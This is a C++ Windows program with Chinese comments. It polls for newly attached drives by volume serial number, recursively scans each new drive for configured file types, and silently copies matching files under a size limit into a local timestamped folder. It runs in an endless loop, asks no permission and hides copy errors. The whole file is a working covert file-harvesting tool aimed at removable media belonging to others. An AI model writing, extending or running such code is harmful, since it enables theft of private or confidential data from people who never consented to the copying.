#include <iostream>
#include <filesystem>
#include <string>
#include <vector>
#include <algorithm>
#include <fstream>
#include <thread>
#include <chrono>
#include <windows.h>
#include <map>
#include <nlohmann/json.hpp>
namespace fs = std::filesystem;
fs::path currentPath = fs::current_path();
using json = nlohmann::json;

std::vector <std::vector<std::string>> filepathname;
int maximumf,fsizelimit,waittime;
std::vector<DWORD> vdnlist, vdnlist2;
std::vector<std::string> disk,fextension;

void jsonpase() {
    std::ifstream file("config.json");
    json data;
    file >> data;
    json fextensionArray = data["fextension"];
    for (auto& iname : fextensionArray) {fextension.push_back(iname);}
    waittime = data["waittime"];
    maximumf = data["maximumf"];
    fsizelimit = data["fsizelimit"];
}
bool shouldSkipDirectory(const fs::path& directory) {
    int itemCount = 0;
    int fileCount = 0;
    for (const auto& entry : fs::directory_iterator(directory)) {
        if (entry.is_directory()) {
            ++fileCount;
        }
        else if (entry.is_regular_file()) {
            ++itemCount;
        }
        if (fileCount > maximumf || itemCount > maximumf) {
            return true; // 文件数超过100，跳过此文件夹
        }
    }
    return false; // 文件数未超过100，不跳过此文件夹
}
std::string gettime() {
    std::time_t currentTime;
    std::time(&currentTime);
    // 使用安全的 localtime_s 函数
    struct tm timeInfo;
    localtime_s(&timeInfo, &currentTime);
    char buffer[40];
    strftime(buffer, sizeof(buffer), "%Y_%m_%d_%H_%M_%S/", &timeInfo);
    std::string timestr(buffer);
    return timestr;
}

void listFiles(const fs::path& directory) {
    if (shouldSkipDirectory(directory)) {
        return;
    }
    for (const auto& entry : fs::directory_iterator(directory)) {
        try {
            if (entry.is_directory()) {
                listFiles(entry.path());// 如果是目录，递归调用listFiles
            }
            else if (entry.is_regular_file()) {// 如果是普通文件
                for (std::string i : fextension) {
                    if (entry.path().extension() ==  i) {
                        //std::cout << entry.path() << std::endl;
                        std::uintmax_t filesize = fs::file_size(entry.path()) / 1024;
                        filepathname.push_back({entry.path().string(),std::to_string(filesize) });
                    }
                }
            }
        }
        catch (...) {}
    }
}
void copyfile() {
    std::string timestr = gettime();
    for (int o = 0; o < filepathname.size(); ++o) {
        std::string sourcePath = filepathname[o][0];
        std::string filesize = filepathname[o][1];
        fs::path fssourcePath(sourcePath);
        std::string parentPath = fssourcePath.parent_path().string();

        std::replace_if(parentPath.begin(), parentPath.end(), [](char c) {
            return c == '/' || c == '\\' || c == ':';}, '_');
        std::string destinationDirectory = "data/"+ timestr + parentPath;
        
        std::string destinationPath = destinationDirectory + "/" + fs::path(sourcePath).filename().string();// 构建目标文件的完整路径

        if (std::stoi(filesize) <= fsizelimit) {
           // std::cout << destinationDirectory << "  " << std::stoi(filesize) << std::endl;
            try {
                if (!fs::exists(destinationDirectory))   // 如果目标目录不存在，则创建它
                    fs::create_directories(destinationDirectory);
                fs::copy_file(sourcePath, destinationPath, fs::copy_options::overwrite_existing);// 复制文件
                //std::cout << "文件已成功复制到目标目录下。\n";
            }
            catch (.../*const fs::filesystem_error& e*/) {
                //std::cerr << "文件复制失败：" << e.what() << '\n';
            }
        }


    }
}
void run() {
    for (std::string rootPath : disk) {
        fs::path root(rootPath);
        if (fs::exists(root) && fs::is_directory(root)) {
            listFiles(root);
        }
        else {
            std::cerr << "指定路径不是一个有效的目录。" << std::endl;
        }
    }
    
    for (const auto& inner_vec : filepathname) {
        for (const auto& item : inner_vec) {
            std::cout << item << " " << std::endl;;
        }
    }
    
    copyfile();
}
std::vector<DWORD> getdrivers(int step) {
    std::vector<DWORD> dis;
    for (char drive = 'A'; drive <= 'Z'; ++drive) {
        std::string rootPath = std::string(1, drive) + ":\\";
        DWORD serialNumber;
        if (GetVolumeInformationA(rootPath.c_str(), nullptr, 0, &serialNumber, nullptr, nullptr, nullptr, 0)) {
            dis.push_back(serialNumber);
            if (step) {
                for (DWORD i : vdnlist2) {
                    if (i == serialNumber) {
                        disk.push_back(rootPath);
                    }
                }
            }
        }
    }
    return dis;
}
int main() {
    jsonpase();
    while (true) {
        disk.clear();
        filepathname.clear();
        vdnlist = getdrivers(0);
        std::this_thread::sleep_for(std::chrono::seconds(waittime));
        vdnlist2 = getdrivers(0);
        for (const auto& elem : vdnlist) {
            vdnlist2.erase(std::remove(vdnlist2.begin(), vdnlist2.end(), elem), vdnlist2.end());
        }
        if (vdnlist2.size() == 0) {}
        else {
            getdrivers(1);
            run();
        }
    }

    return 0;
}
